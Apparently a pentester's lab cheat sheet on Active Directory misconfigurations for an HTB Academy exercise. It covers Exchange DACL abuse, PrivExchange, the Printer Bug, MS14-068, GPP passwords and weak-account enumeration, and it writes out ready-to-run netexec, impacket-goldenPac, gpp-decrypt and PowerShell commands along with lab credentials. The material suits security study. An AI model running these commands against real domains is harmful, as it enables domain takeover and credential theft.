# Misc Misconfigs
```
SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`
```
## Exchange Group membership
- `Exchange Windows Permissions` GROUP: The default installation for Microsoft exchange server give its members the ability to Write DACL, which means any member can just Give DCSync Privs to a low privileged user and compromise the whole domain -> refer to this [gdedrouas/Exchange-AD-Privesc: Exchange privilege escalations to Active Directory](https://github.com/gdedrouas/Exchange-AD-Privesc)
- `Organization Management` group: this is like the Domain Admins of Exchange, any member can read all mailboxes in the domain
## PrivExchange
- This attack comes from flaw in `PushSubscription` in Exchange server, were we can coerce the Exchange server to authenticate to any host provided by the client over HTTP
- since Exchange server runs as SYSTEM, we can relay this authentication to dump the NTDS db, and if we can't relay LDAP we can just authenticate to any host, all we need is domain user

## Printer Bug
- Flaw in Microsoft-Print-System-Remote-Protocol where we can force server to authenticate to any host we provide over SMB
- Spooler service runs as SYSTEM, so we can relay it To do DCSync on the DC
- We can leverage it to grant Resource-based Constraint delegation on victim user to computer we control
### Scanning - using [SecurityAssessment.ps1](https://github.com/itzvenom/Security-Assessment-PS)
```powershell
import-module SecurityAssessment.ps1
Get-SpoolerStatus -ComputerName DC01.TARGETdomain.com
```
## MS14-068
### Scanning - metasploit
```bash
use auxiliary/scanner/kerberos/ms14_068_kerberos_checksum
set RHOSTS 172.16.5.5
set DOMAIN INLANEFREIGHT.LOCAL
run
```
### Scanning - Netexec
```bash
nxc smb 172.16.5.5 -u 'user' -p 'password' -M wmi -o QUERY="SELECT HotFixID FROM Win32_QuickFixEngineering WHERE HotFixID = 'KB3011780'"
```
### Exploitation - Impacket-goldenPac
```bash
Impacket-goldenPac "$DOMAIN_FQDN"/"$USER":"$PASSWORD"@"$DC_HOST" -dc-ip "$DC_IP"
```
## Enumerating DNS Records
### **adidnsdump** (valid user credentials needed)
```bash 
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r # -r for resolving ip addresses
```

## Password in Description field
```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
## PASSWD_NOTREQD flag
- users with this flag might have empty of very week password, since they are not subject to password policy
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
## Group Policy Preferences (GPP) Passwords
### Scanning - Netexec
1. **gpp_autologin**
```bash
nxc smb 10.10.122.8 -u minyawy -p 'obaws!@SSA' -M gpp_autologin
```
2. **gpp_password**
```bash
nxc smb 10.10.122.8 -u minyawy -p 'obaws!@SSA' -M gpp_password
```
3. Manually decrypting the `cpassword` 
```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```
